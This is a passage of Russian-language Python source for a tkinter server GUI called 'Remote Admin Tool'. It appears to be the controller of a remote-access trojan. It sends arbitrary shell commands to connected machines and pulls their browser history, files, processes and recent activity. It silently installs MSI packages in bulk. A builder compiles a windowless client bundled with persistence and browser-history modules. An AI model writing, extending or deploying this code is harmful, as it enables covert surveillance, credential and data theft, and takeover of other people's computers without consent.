        self.log_area.configure(state='disabled')
        self.log_area.see(tk.END)

    def send_message(self, event=None):
        text = self.message_entry.get().strip()
        if not text or not self.client_socket:
            return
        try:
            self.client_socket.send(f"CHAT_MSG::{text}".encode('utf-8'))
            self.log("Админ", text)
            self.message_entry.delete(0, tk.END)
        except Exception as e:
            self.log("Система", f"Ошибка отправки: {e}")

    def on_closing(self):
        self.server_gui.chat_windows.pop(self.client_info['ip'], None)
        self.destroy()

class ConsoleWindow(tk.Toplevel):
    def __init__(self, master, server_gui, client_socket, client_info):
        super().__init__(master)
        self.title(f"Консоль - {client_info['pc_name']} ({client_info['ip']})")
        self.geometry("700x500")
        self.server_gui = server_gui
        self.client_socket = client_socket
        self.client_info = client_info

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.red_accent = "#ff3333"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        self.log_area = scrolledtext.ScrolledText(self, wrap=tk.WORD, bg=self.entry_bg, fg=self.fg_color, insertbackground=self.fg_color, relief="flat")
        self.log_area.pack(padx=10, pady=10, fill="both", expand=True)
        self.log_area.configure(state='disabled')

        actions_frame = tk.Frame(self, bg=self.bg_color)
        actions_frame.pack(fill='x', padx=10, pady=(0, 5))

        sysinfo_button = tk.Button(
            actions_frame,
            text="Системная инфо",
            command=self.send_sysinfo,
            bg=self.red_accent,
            fg="white",
            relief="flat",
            activebackground="#b30000",
            activeforeground="white",
            borderwidth=0,
            padx=8
        )
        sysinfo_button.pack(side=tk.LEFT, padx=3)

        netstat_button = tk.Button(
            actions_frame,
            text="Сетевые соединения",
            command=self.send_netstat,
            bg=self.red_accent,
            fg="white",
            relief="flat",
            activebackground="#b30000",
            activeforeground="white",
            borderwidth=0,
            padx=8
        )
        netstat_button.pack(side=tk.LEFT, padx=3)

        startup_button = tk.Button(
            actions_frame,
            text="Автозагрузка",
            command=self.send_startup_info,
            bg=self.red_accent,
            fg="white",
            relief="flat",
            activebackground="#b30000",
            activeforeground="white",
            borderwidth=0,
            padx=8
        )
        startup_button.pack(side=tk.LEFT, padx=3)

        bottom_frame = tk.Frame(self, bg=self.bg_color)
        bottom_frame.pack(fill='x', padx=10, pady=5)

        self.command_entry = tk.Entry(bottom_frame, bg=self.entry_bg, fg=self.fg_color, relief="flat", insertbackground=self.fg_color)
        self.command_entry.pack(side=tk.LEFT, expand=True, fill='x', ipady=5)
        self.command_entry.bind("<Return>", self.send_command)

        self.send_button = tk.Button(bottom_frame, text="Отправить", command=self.send_command, bg=self.red_accent, fg="white", relief="flat", activebackground="#b30000", activeforeground="white", borderwidth=0, padx=10)
        self.send_button.pack(side=tk.RIGHT, padx=5)
        
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def send_command(self, event=None):
        command = self.command_entry.get()
        if command and self.client_socket:
            try:
                lock = self.server_gui.clients.get(self.client_info['ip'], {}).get('lock')
                if lock:
                    with lock:
                        self.client_socket.sendall(command.encode('utf-8'))
                else:
                    self.client_socket.sendall(command.encode('utf-8'))
                self.log(f">> {command}")
                self.command_entry.delete(0, tk.END)
            except Exception as e:
                self.log(f"[!] Ошибка отправки: {e}")
                self.destroy()

    def send_quick_command(self, command_text):
        if not self.client_socket:
            return
        try:
            lock = self.server_gui.clients.get(self.client_info['ip'], {}).get('lock')
            if lock:
                with lock:
                    self.client_socket.sendall(command_text.encode('utf-8'))
            else:
                self.client_socket.sendall(command_text.encode('utf-8'))
            self.log(f">> {command_text}")
        except Exception as e:
            self.log(f"[!] Ошибка отправки: {e}")
            self.destroy()

    def send_sysinfo(self):
        self.send_quick_command("SYSINFO")

    def send_netstat(self):
        self.send_quick_command("NETSTAT")

    def send_startup_info(self):
        self.send_quick_command("LIST_STARTUP")

    def log(self, message):
        self.log_area.configure(state='normal')
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.configure(state='disabled')
        self.log_area.see(tk.END)

    def on_closing(self):
        self.server_gui.console_windows.pop(self.client_info['ip'], None)
        self.destroy()


class MsiDeployWindow(tk.Toplevel):
    def __init__(self, parent, server_gui):
        super().__init__(parent)
        self.server_gui = server_gui
        self.title('Массовая установка MSI')
        self.geometry('900x560')
        self.configure(bg=server_gui.bg_color)
        self.selected_msi = ''

        top_frame = tk.Frame(self, bg=server_gui.bg_color)
        top_frame.pack(fill='x', padx=10, pady=10)

        tk.Label(top_frame, text='MSI-файл:', bg=server_gui.bg_color, fg=server_gui.fg_color).pack(side=tk.LEFT)
        self.msi_label = tk.Label(top_frame, text='не выбран', bg=server_gui.bg_color, fg='#9e9e9e', anchor='w')
        self.msi_label.pack(side=tk.LEFT, fill='x', expand=True, padx=8)

        tk.Button(top_frame, text='Выбрать .msi', command=self.choose_msi, bg=server_gui.red_accent, fg='white', relief='flat').pack(side=tk.LEFT, padx=4)
        tk.Button(top_frame, text='Обновить список', command=self.refresh_clients, bg=server_gui.entry_bg, fg=server_gui.fg_color, relief='flat').pack(side=tk.LEFT, padx=4)

        columns = ('ip', 'pc_name', 'user', 'os', 'status')
        self.tree = ttk.Treeview(self, columns=columns, show='headings', selectmode='extended')
        headings = {'ip': 'IP', 'pc_name': 'Имя ПК', 'user': 'Пользователь', 'os': 'ОС', 'status': 'Статус'}
        widths = {'ip': 130, 'pc_name': 170, 'user': 140, 'os': 220, 'status': 260}
        for col in columns:
            self.tree.heading(col, text=headings[col])
            self.tree.column(col, width=widths[col], anchor='w')
        self.tree.pack(expand=True, fill='both', padx=10, pady=(0, 10))

        bottom = tk.Frame(self, bg=server_gui.bg_color)
        bottom.pack(fill='x', padx=10, pady=(0, 10))
        tk.Button(bottom, text='Выделить все', command=self.select_all, bg=server_gui.entry_bg, fg=server_gui.fg_color, relief='flat').pack(side=tk.LEFT, padx=4)
        tk.Button(bottom, text='Снять выделение', command=self.clear_selection, bg=server_gui.entry_bg, fg=server_gui.fg_color, relief='flat').pack(side=tk.LEFT, padx=4)
        tk.Button(bottom, text='Установить на выбранные', command=self.install_selected, bg=server_gui.red_accent, fg='white', relief='flat', padx=12, pady=6).pack(side=tk.RIGHT, padx=4)

        self.log_text = scrolledtext.ScrolledText(self, height=8, bg=server_gui.entry_bg, fg=server_gui.fg_color, insertbackground=server_gui.fg_color)
        self.log_text.pack(fill='x', padx=10, pady=(0, 10))

        self.refresh_clients()

    def choose_msi(self):
        path = filedialog.askopenfilename(title='Выберите MSI-файл', filetypes=[('MSI packages', '*.msi')])
        if path:
            self.selected_msi = path
            self.msi_label.config(text=path, fg=self.server_gui.fg_color)

    def refresh_clients(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        for ip, data in self.server_gui.clients.items():
            info = data.get('info', {})
            self.tree.insert('', 'end', iid=ip, values=(ip, info.get('pc_name', ''), info.get('user', ''), info.get('os', ''), 'готов'))

    def select_all(self):
        self.tree.selection_set(self.tree.get_children())

    def clear_selection(self):
        self.tree.selection_remove(self.tree.selection())

    def log(self, text):
        self.log_text.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')}  {text}\n")
        self.log_text.see(tk.END)

    def set_status(self, ip, status):
        if self.tree.exists(ip):
            values = list(self.tree.item(ip, 'values'))
            if len(values) >= 5:
                values[4] = status
                self.tree.item(ip, values=values)

    def install_selected(self):
        if not self.selected_msi:
            messagebox.showwarning('MSI не выбран', 'Сначала выберите .msi файл.')
            return
        if not self.selected_msi.lower().endswith('.msi'):
            messagebox.showwarning('Неверный файл', 'Разрешены только .msi файлы.')
            return
        targets = list(self.tree.selection())
        if not targets:
            messagebox.showwarning('Нет компьютеров', 'Выберите один или несколько компьютеров.')
            return
        if not messagebox.askyesno('Подтверждение', f'Установить MSI на выбранные компьютеры: {len(targets)} шт.?'):
            return
        threading.Thread(target=self._install_many_worker, args=(targets, self.selected_msi), daemon=True).start()

    def _install_many_worker(self, targets, msi_path):
        for ip in targets:
            if ip not in self.server_gui.clients:
                self.after(0, self.set_status, ip, 'не подключен')
                continue
            self.after(0, self.set_status, ip, 'установка...')
            self.after(0, self.log, f'{ip}: отправка MSI')
            ok, message = self.server_gui.install_msi_to_client(ip, msi_path)
            self.after(0, self.set_status, ip, 'успешно' if ok else 'ошибка')
            self.after(0, self.log, f'{ip}: {message}')


class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Remote Admin Tool")
        self.root.geometry("900x600")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.server_socket = None
        self.server_thread = None
        self.clients = {}
        self.console_windows = {}
        self.file_manager_windows = {}
        self.process_windows = {}
        self.chat_windows = {}

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.red_accent = "#ff3333"
        self.entry_bg = "#333333"
        self.root.configure(bg=self.bg_color)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TNotebook", background=self.bg_color, borderwidth=0)
        style.configure("TNotebook.Tab", background="#2c2c2c", foreground=self.fg_color, lightcolor=self.bg_color, borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", self.bg_color)], foreground=[("selected", self.red_accent)])
        style.configure("TFrame", background=self.bg_color)
        style.configure("TLabelframe", background=self.bg_color, foreground=self.fg_color)
        style.configure("TLabelframe.Label", background=self.bg_color, foreground=self.red_accent)
        style.configure("Treeview", background=self.entry_bg, foreground=self.fg_color, fieldbackground=self.entry_bg, rowheight=25)
        style.configure("Treeview.Heading", background="#2c2c2c", foreground=self.red_accent, relief="flat")
        style.map("Treeview.Heading", background=[('active', '#444')])

        self.tabControl = ttk.Notebook(self.root)
        self.main_tab = ttk.Frame(self.tabControl, style="TFrame")
        self.builder_tab = ttk.Frame(self.tabControl, style="TFrame")
        self.deploy_tab = ttk.Frame(self.tabControl, style="TFrame")
        self.tabControl.add(self.main_tab, text='Главная')
        self.tabControl.add(self.builder_tab, text='Билдер')
        self.tabControl.add(self.deploy_tab, text='Установка MSI')
        self.tabControl.pack(expand=1, fill="both")

        self.create_main_tab()
        self.create_builder_tab()
        self.create_deploy_tab()
        
        self.start_server()

    def create_main_tab(self):
        cols = ('ip', 'pc_name', 'user', 'os', 'category')
        self.tree = ttk.Treeview(self.main_tab, columns=cols, show='headings')
        
        for col in cols:
            self.tree.heading(col, text=col.capitalize())
        self.tree.pack(expand=True, fill='both', padx=10, pady=10)

        self.tree.bind("<Button-3>", self.show_context_menu)

        actions_frame = tk.Frame(self.main_tab, bg=self.bg_color)
        actions_frame.pack(fill='x', padx=10, pady=(0, 10))

        export_button = tk.Button(
            actions_frame,
            text="Экспорт в Excel (CSV)",
            command=self.export_clients_to_excel,
            bg=self.red_accent,
            fg="white",
            relief="flat",
            activebackground="#b30000",
            activeforeground="white",
            borderwidth=0,
            padx=10,
            pady=6
        )
        export_button.pack(side=tk.LEFT)

        self.context_menu = tk.Menu(self.root, tearoff=0, bg=self.entry_bg, fg=self.fg_color)
        self.context_menu.add_command(label="Открыть консоль", command=self.open_console)
        self.context_menu.add_command(label="Файловый менеджер", command=self.open_file_manager)
        self.context_menu.add_command(label="Просмотр истории", command=self.show_history)
        self.context_menu.add_command(label="Последние действия", command=self.show_recent_activity)
        self.context_menu.add_command(label="Процессы", command=self.open_process_manager)
        self.context_menu.add_command(label="Чат", command=self.open_chat)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Установить программу (.msi)", command=self.install_msi_single)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Задать категорию", command=self.set_category)

    def export_clients_to_excel(self):
        rows = []
        for item_id in self.tree.get_children():
            values = self.tree.item(item_id, 'values')
            if values:
                rows.append(values)

        if not rows:
            messagebox.showinfo("Экспорт", "Нет данных для экспорта.")
            return

        default_name = f"clients_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        save_path = filedialog.asksaveasfilename(
            title="Сохранить таблицу",
            defaultextension=".csv",
            initialfile=default_name,
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")]
        )
        if not save_path:
            return

        try:
            with open(save_path, "w", newline="", encoding="utf-8-sig") as f:
                writer = csv.writer(f, delimiter=';')
                writer.writerow(["IP", "Имя ПК", "Пользователь", "ОС", "Категория"])
                writer.writerows(rows)
            messagebox.showinfo("Экспорт", f"Таблица успешно сохранена:\n{save_path}")
        except Exception as e:
            messagebox.showerror("Ошибка экспорта", f"Не удалось сохранить файл:\n{e}")

    def show_context_menu(self, event):
        item_id = self.tree.identify_row(event.y)
        if item_id:
            self.tree.selection_set(item_id)
            self.context_menu.post(event.x_root, event.y_root)

    def open_file_manager(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
            
            if ip in self.clients and ip not in self.file_manager_windows:
                client_data = self.clients[ip]
                fm_window = FileManagerWindow(self.root, self, client_data['socket'], client_data['info'])
                self.file_manager_windows[ip] = fm_window
            elif ip in self.file_manager_windows:
                self.file_manager_windows[ip].lift()
        except IndexError:
            pass

    def open_process_manager(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]

            if ip in self.clients and ip not in self.process_windows:
                client_data = self.clients[ip]
                pm_window = ProcessManagerWindow(self.root, self, client_data['socket'], client_data['info'])
                self.process_windows[ip] = pm_window
            elif ip in self.process_windows:
                self.process_windows[ip].lift()
        except IndexError:
            pass

    def open_chat(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]

            if ip in self.clients and ip not in self.chat_windows:
                client_data = self.clients[ip]
                chat_window = ChatWindow(self.root, self, client_data['socket'], client_data['info'])
                self.chat_windows[ip] = chat_window
            elif ip in self.chat_windows:
                self.chat_windows[ip].lift()
        except IndexError:
            pass


    def install_msi_single(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
        except IndexError:
            return

        path = filedialog.askopenfilename(title='Выберите MSI-файл', filetypes=[('MSI packages', '*.msi')])
        if not path:
            return
        if not path.lower().endswith('.msi'):
            messagebox.showwarning('Неверный файл', 'Разрешены только .msi файлы.')
            return
        if not messagebox.askyesno('Подтверждение', f'Установить MSI на компьютер {ip}?'):
            return

        def worker():
            ok, message = self.install_msi_to_client(ip, path)
            if ok:
                self.root.after(0, lambda: messagebox.showinfo('Установка MSI', f'{ip}: {message}'))
            else:
                self.root.after(0, lambda: messagebox.showerror('Установка MSI', f'{ip}: {message}'))

        threading.Thread(target=worker, daemon=True).start()

    def install_msi_to_client(self, ip, msi_path):
        if ip not in self.clients:
            return False, 'клиент не подключен'
        if not os.path.isfile(msi_path):
            return False, 'MSI-файл не найден'
        if not msi_path.lower().endswith('.msi'):
            return False, 'разрешены только MSI-файлы'

        client_data = self.clients[ip]
        client_socket = client_data['socket']
        client_lock = client_data['lock']
        filename = os.path.basename(msi_path)
        size = os.path.getsize(msi_path)

        try:
            with client_lock:
                header = f'INSTALL_MSI::{filename}::{size}'.encode('utf-8')
                client_socket.sendall(header)

                client_socket.settimeout(30)
                ack = client_socket.recv(64)
                if ack != b'READY_FOR_MSI':
                    return False, f'клиент не подтвердил приём MSI: {ack!r}'

                with open(msi_path, 'rb') as f:
                    while True:
                        chunk = f.read(65536)
                        if not chunk:
                            break
                        client_socket.sendall(chunk)

                result = read_framed_json(client_socket, 'INSTALL_MSI_RESULT', timeout=1900)

            code = result.get('returncode')
            base_message = result.get('message') or ''

            if result.get('ok'):
                extra = ''
                if code == 3010:
                    extra = ' Требуется перезагрузка.'
                return True, f"установлено: {result.get('file', filename)}.{extra}"

            details = (
                result.get('stderr')
                or result.get('stdout')
                or result.get('log_tail')
                or base_message
                or f"код возврата {code}"
            )
            details = details.strip()
            if base_message and base_message not in details:
                details = f"{base_message}\n\n{details}"
            if result.get('log_path'):
                details += f"\n\nЛог на клиенте: {result.get('log_path')}"
            return False, details[:3000]
        except Exception as e:
            return False, f'Ошибка обмена с клиентом: {e}'

    def set_category(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
            
            if ip in self.clients:
                current_category = self.clients[ip]['info'].get('category', '')
                new_category = simpledialog.askstring("Категория", "Введите новую категорию:", initialvalue=current_category)
                
                if new_category:
                    self.clients[ip]['info']['category'] = new_category
                    self.tree.item(selected_item, values=(
                        self.clients[ip]['info']['ip'],
                        self.clients[ip]['info']['pc_name'],
                        self.clients[ip]['info']['user'],
                        self.clients[ip]['info']['os'],
                        new_category
                    ))
        except IndexError:
            pass

    def open_console(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
            
            if ip in self.clients and ip not in self.console_windows:
                client_data = self.clients[ip]
                console = ConsoleWindow(self.root, self, client_data['socket'], client_data['info'])
                self.console_windows[ip] = console
            elif ip in self.console_windows:
                self.console_windows[ip].lift()
        except IndexError:
            pass

    def show_history(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
            client_data = self.clients[ip]
            BrowserHistoryWindow(self.root, self, client_data['socket'], client_data['info'])
        except IndexError:
            pass

    def show_recent_activity(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
            client_data = self.clients[ip]
            RecentActivityWindow(self.root, self, client_data['socket'], client_data['info'])
        except IndexError:
            pass

    def get_history_data(self, client_socket, lock):
        with lock:
            try:
                client_socket.send("GET_HISTORY".encode('utf-8'))
                full_data = b""
                client_socket.settimeout(10.0)
                while True:
                    try:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        full_data += chunk
                        if len(chunk) < 4096:
                            break
                    except socket.timeout:
                        break
                client_socket.settimeout(None)
                history_text = full_data.decode('utf-8', errors='ignore')
                if history_text and "не найден" not in history_text and "Ошибка" not in history_text:
                    self.root.after(0, lambda: LogWindow(self.root, "История браузера", history_text))
                else:
                    self.root.after(0, lambda: messagebox.showinfo("Информация", "Не удалось получить историю или она пуста."))
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("Ошибка", f"Не удалось получить историю: {e}"))

    def show_uninstall_log(self):
        try:
            selected_item = self.tree.selection()[0]
            ip = self.tree.item(selected_item, 'values')[0]
            client_socket = self.clients[ip]['socket']
            threading.Thread(target=self.get_log_data, args=(client_socket,), daemon=True).start()
        except IndexError:
            pass

    def show_uninstall_log(self):
        pass

    def get_log_data(self, client_socket):
        pass

    def uninstall_client(self):
        pass


    def create_deploy_tab(self):
        info_frame = ttk.LabelFrame(self.deploy_tab, text='Массовая установка MSI', style='TLabelframe')
        info_frame.pack(padx=20, pady=20, fill='x')

        description = (
            'Здесь можно выбрать один MSI-файл и установить его на несколько подключённых компьютеров.\n'
            'Установка выполняется тихо через msiexec /i <файл> /qn /norestart.\n'
            'Если MSI требует права администратора, агент на рабочем компьютере тоже должен быть запущен с такими правами.'
        )
        tk.Label(info_frame, text=description, bg=self.bg_color, fg=self.fg_color, justify=tk.LEFT).pack(anchor='w', padx=10, pady=10)

        tk.Button(
            info_frame,
            text='Открыть установку MSI',
            command=lambda: MsiDeployWindow(self.root, self),
            bg=self.red_accent,
            fg='white',
            relief='flat',
            activebackground='#b30000',
            activeforeground='white',
            borderwidth=0,
            padx=16,
            pady=8
        ).pack(anchor='w', padx=10, pady=(0, 10))

    def create_builder_tab(self):
        builder_frame = ttk.LabelFrame(self.builder_tab, text="Настройки билда", style="TLabelframe")
        builder_frame.pack(padx=20, pady=20, fill="x")

        ip_label = tk.Label(builder_frame, text="IP адрес сервера:", bg=self.bg_color, fg=self.fg_color)
        ip_label.grid(row=0, column=0, padx=10, pady=10, sticky='w')
        self.ip_entry = tk.Entry(builder_frame, width=30, bg=self.entry_bg, fg=self.fg_color, relief="flat", insertbackground=self.fg_color)
        self.ip_entry.grid(row=0, column=1, padx=10, pady=10, sticky='w')
        self.ip_entry.insert(0, "127.0.0.1")

        ip_help_label = tk.Label(builder_frame, 
                                 text="Для подключения с другого ПК в той же сети,\nвведите локальный IP этого компьютера (команда: ipconfig).", 
                                 bg=self.bg_color, fg="#9e9e9e", justify=tk.LEFT)
        ip_help_label.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 10), sticky='w')

        port_label = tk.Label(builder_frame, text="Порт сервера:", bg=self.bg_color, fg=self.fg_color)
        port_label.grid(row=2, column=0, padx=10, pady=10, sticky='w')
        self.port_entry = tk.Entry(builder_frame, width=30, bg=self.entry_bg, fg=self.fg_color, relief="flat", insertbackground=self.fg_color)
        self.port_entry.grid(row=2, column=1, padx=10, pady=10, sticky='w')
        self.port_entry.insert(0, "9999")

        self.build_button = tk.Button(builder_frame, text="Собрать EXE", command=self.build_client, bg=self.red_accent, fg="white", relief="flat", activebackground="#b30000", activeforeground="white", borderwidth=0, pady=10, padx=20)
        self.build_button.grid(row=3, column=0, columnspan=2, pady=20)

    def start_server(self):
        self.server_thread = threading.Thread(target=self.server_loop, daemon=True)
        self.server_thread.start()

    def server_loop(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', 9999))
            self.server_socket.listen(5)
            
            while True:
                client_socket, addr = self.server_socket.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr), daemon=True)
                client_thread.start()
        except OSError:
            pass

    def handle_client(self, client_socket, addr):
        ip = addr[0]
        client_lock = threading.Lock()
        try:
            initial_data = client_socket.recv(1024).decode('utf-8')
            if initial_data.startswith("PC_INFO::"):
                _, pc_name, user, os_info = initial_data.split("::")
                client_info = {'pc_name': pc_name, 'user': user, 'os': os_info, 'ip': ip, 'category': 'По умолчанию'}
                
                self.clients[ip] = {'socket': client_socket, 'info': client_info, 'lock': client_lock}
                self.root.after(0, self.add_client_to_tree, client_info)

            while True:
                if not client_lock.acquire(blocking=False):
                    time.sleep(0.1)
                    continue

                try:
                    client_socket.settimeout(0.1)
                    message = client_socket.recv(8192).decode('utf-8', errors='ignore')
                    client_socket.settimeout(None)

                    if not message:
                        break
                    
                    if message.startswith("DRIVES::"):
                        drives = message.split("::")[1:]
                        if ip in self.file_manager_windows:
                            self.root.after(0, self.file_manager_windows[ip].update_drive_list, drives)
                    elif message.startswith("DIR_CONTENT::"):
                        content = message.split("::", 1)[1]
                        if ip in self.file_manager_windows:
                            self.root.after(0, self.file_manager_windows[ip].update_file_list, content)
                    elif message.startswith("CHAT_FROM_AGENT::"):
                        text = message.split("::", 1)[1]
                        if ip in self.chat_windows:
                            self.root.after(0, self.chat_windows[ip].log, "Агент", text)
                        else:
                            self.root.after(0, lambda: messagebox.showinfo(
                                "Сообщение от агента",
                                f"{ip}: {text}"
                            ))
                    elif ip in self.console_windows:
                        self.root.after(0, self.console_windows[ip].log, message)

                except socket.timeout:
                    continue
                except (ConnectionResetError, ConnectionAbortedError):
                    break
                finally:
                    if client_lock.locked():
                        client_lock.release()
        except (ConnectionResetError, ConnectionAbortedError):
            pass
        finally:
            self.remove_client(ip)
            client_socket.close()

    def add_client_to_tree(self, info):
        if not self.tree.exists(info['ip']):
            self.tree.insert("", "end", iid=info['ip'], values=(
                info['ip'], info['pc_name'], info['user'], info['os'], info.get('category', 'По умолчанию')
            ))

    def remove_client(self, ip):
        if ip in self.clients:
            self.clients.pop(ip, None)
        if ip in self.console_windows:
            self.root.after(0, self.console_windows.pop(ip).destroy)
        if ip in self.file_manager_windows:
            self.root.after(0, self.file_manager_windows.pop(ip).destroy)
        if ip in self.process_windows:
            self.root.after(0, self.process_windows.pop(ip).destroy)
        if ip in self.chat_windows:
            self.root.after(0, self.chat_windows.pop(ip).destroy)
        if self.tree.exists(ip):
            self.root.after(0, self.tree.delete, ip)

    def on_closing(self):
        if self.server_socket:
            self.server_socket.close()
        self.root.destroy()

    def build_client(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()

        if not ip or not port:
            messagebox.showerror("Ошибка", "IP и порт не могут быть пустыми.")
            return

        try:
            with open('client.py', 'r', encoding='utf-8') as f:
                client_code = f.read()

            client_code = client_code.replace("host = '127.0.0.1'", f"host = '{ip}'")
            client_code = client_code.replace("port = 9999", f"port = {port}")

            build_file = "client_build.py"
            with open(build_file, 'w', encoding='utf-8') as f:
                f.write(client_code)
            
            messagebox.showinfo("Сборка", "Начинаю сборку client.exe... Это может занять некоторое время.")
            
            command = [
                'python', '-m', 'PyInstaller',
                '--onefile', '--noconsole',
                f'--add-data=browser_history.py;.',
                f'--add-data=persistence.py;.',
                build_file
            ]
            
            threading.Thread(target=self.run_build_process, args=(command,), daemon=True).start()

        except Exception as e:
            messagebox.showerror("Ошибка", f"Ошибка при подготовке к сборке: {e}")

    def run_build_process(self, command):
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                self.root.after(0, lambda: messagebox.showinfo("Успех", "Сборка client.exe успешно завершена!\nФайл находится в папке 'dist'."))
            else:
                self.root.after(0, lambda: messagebox.showerror("Ошибка сборки", f"Произошла ошибка:\n{stderr}"))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Ошибка сборки", f"Произошла критическая ошибка:\n{e}"))
        finally:
            if os.path.exists("client_build.py"):
                os.remove("client_build.py")
            if os.path.exists("client_build.spec"):
                os.remove("client_build.spec")

if __name__ == "__main__":
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()
